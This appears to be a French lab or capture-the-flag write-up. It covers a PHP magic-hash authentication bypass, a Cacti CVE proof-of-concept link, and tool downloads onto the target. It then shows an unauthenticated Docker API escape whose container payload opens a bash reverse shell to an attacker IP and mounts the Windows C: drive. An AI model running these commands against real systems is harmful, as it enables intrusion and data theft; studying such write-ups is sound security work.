![[IMG-20251209172404463.png]]
![[Pasted image 20251208190315.png]]

![[Pasted image 20251208190330.png]]

![[Pasted image 20251209004618.png]]

![[Pasted image 20251209004647.png]]

En PHP, l’utilisation de l’opérateur de comparaison lâche `==` peut entraîner des conversions automatiques de type (type juggling).  
Ces conversions peuvent provoquer des comportements inattendus, notamment lors de comparaisons entre chaînes de caractères et valeurs numériques.  
Dans un contexte d’authentification, ce mécanisme peut permettre un contournement de contrôle si l’application ne valide pas strictement les types.

## Magic Hashes

Certaines chaînes de caractères prenant la forme d’une notation scientifique, par exemple `0e1234`, sont interprétées par PHP comme des valeurs numériques.  
Lorsqu’une comparaison lâche est effectuée, PHP convertit ces chaînes en nombres flottants. Une chaîne commençant par `0e` suivie uniquement de chiffres est interprétée comme étant égale à 0.

Exemples de conversions implicites :  
`"0e1234" == "0e9999"` est évalué à VRAI car les deux chaînes sont interprétées comme la valeur numérique 0.  
`"0e1234" == 0` est évalué à VRAI pour la même raison.

Ces chaînes sont couramment appelées « Magic Hashes ».

## Exploitation en Cas de Comparaison Lâche

Si un code de vérification utilise une comparaison non stricte, par exemple :
```php
if ($stored_token == $_GET['token']) {
    // accès autorisé
}
```
alors toute valeur de type Magic Hash peut être acceptée comme équivalente à un token légitime si ce dernier est lui aussi convertible en valeur numérique.  
Cela peut conduire à un contournement complet d’un mécanisme d’authentification.

## Comparaison Stricte

L’opérateur strict `===` compare à la fois la valeur et le type des opérandes sans conversion automatique.  
Une chaîne comme `"0e1234"` n’est jamais considérée comme égale à un entier ou à une autre chaîne différente.  
Ainsi, `"0e1234" === "0e9999"` est évalué à FAUX, de même que `"0e1234" === 0`.

Le recours systématique à `===` pour les vérifications de tokens, hachages, identifiants uniques et données sensibles élimine ce type de vulnérabilité.


![[Pasted image 20251208211242.png]]

![[Pasted image 20251209004733.png]]
![[Pasted image 20251209004742.png]]
[CVE-2025-24367](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
![[Pasted image 20251209003245.png]]

![[Pasted image 20251209003253.png]]

![[Pasted image 20251209004847.png]]

![[Pasted image 20251209120245.png]]


![[Pasted image 20251209120607.png]]
192.168.65.7
https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap                                 
php -r "copy('http://10.10.14.116:8080/nmap.1', '/tmp/nmap');"
php -r "copy('http://10.10.14.116:8000/fscan.1', '/tmp/fscan');"

![[IMG-20251210230253751.png]]
wget https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
![[IMG-20251210230253801.png]]

## 2. Étape 1 : Énumération des images Docker
L’API permet d’identifier les images disponibles sur l’hôte :

```
curl -s http://192.168.65.7:2375/images/json
```

![[IMG-20251210230254153.png]]
Cela révèle une image telle que :

```
docker_setup-nginx-php:latest
```

---

## 3. Étape 2 : Création d’un conteneur malveillant
On crée un nouveau conteneur basé sur une image existante, en y injectant une commande de reverse shell.

Exemple de fichier `create_container.json` :

```json
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.116/4444 0>&1"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/host_root"]
  }
}
```

![[IMG-20251210230253910.png]]
Exécution :

```
curl -H "Content-Type: application/json"      -d @create_container.json      http://192.168.65.7:2375/containers/create -o response.json
```

![[IMG-20251210230253975.png]]

Le résultat contient un champ `"Id"` correspondant au nouvel identifiant du conteneur.

---

## 4. Étape 3 : Démarrage du conteneur


```
curl -X POST http://192.168.65.7:2375/containers/$cid/start
```
![[IMG-20251210230254018.png]]

Un reverse shell est alors établi vers la machine de l’attaquant.

---

## 5. Étape 4 : Accès au système Windows
Grâce au montage bind :

```
"/mnt/host/c:/host_root"
```

le conteneur possède un accès direct au disque C: de Windows dans :

```
/host_root
```

On peut alors naviguer dans les fichiers utilisateurs ou administrateurs.
![[IMG-20251210230254091.png]]
![[IMG-20251210230253844.png]]
Cela permet de récupérer le flag ou prendre le contrôle complet du système.

---

## 6. Résumé de la chaîne d’attaque
1. Découverte du port 2375 exposé.
2. Vérification de l’accès non authentifié.
3. Énumération des images Docker.
4. Création d’un conteneur malveillant avec reverse shell.
5. Démarrage du conteneur pour exécuter la charge utile.
6. Accès au disque Windows via montage bind.
7. Extraction de données sensibles ou élévation de privilèges.

                         +--------------------------------------+
                         |          Windows 10 / Windows 11     |
                         |              Hôte principal          |
                         |--------------------------------------|
                         |  Interface physique: 10.129.x.x       |
                         |                                      |
                         |  Interface WSL2 Host (NAT):           |
                         |        IP = 192.168.65.7              |
                         |        Port 2375 = Docker API         |
                         +------------------|--------------------+
                                            |
											| NAT interne (Hyper-V / WSL2)
                                            |
                         +------------------v--------------------+
                         |            WSL2 VM Linux              |
                         |---------------------------------------|
                         |  Interface eth0 : 172.18.0.1 (Docker) |
                         |  Rôle : hôte Docker pour les conteneurs |
                         +------------------|--------------------+
                                            |
                                            | Docker bridge (docker0)
                                            |
     ------------------------------------------------------------------------------------
     |                                   |                                            |
+----v----------------+        +---------v-----------+                       +---------v-----------+
|   Container web    |        |  Container MariaDB  |                       |  (Autres conteneurs) |
|  Cacti vulnérable  |        |   Base de données   |                       |        éventuels      |
| IP : 172.18.0.3    |        | IP : 172.18.0.2     |                       |                       |
+---------------------+        +---------------------+                       +-----------------------+
         |                               |
         | Reverse shell obtenu           |
         | depuis vuln. RCE Cacti         |
         +--------------------------------+


